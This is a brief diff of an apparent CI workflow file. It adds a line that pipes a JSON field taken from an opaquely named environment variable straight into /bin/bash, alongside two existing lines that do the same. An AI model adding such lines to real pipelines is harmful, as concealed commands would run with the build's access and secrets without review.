@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$nvvr5" | jq -r .udshk28544 | /bin/bash
           echo $eegr98 | jq -r .fye609 | /bin/bash
+          echo $oqu2 | jq -r .jew9 | /bin/bash
 
       - name: Archive output
         if: always()
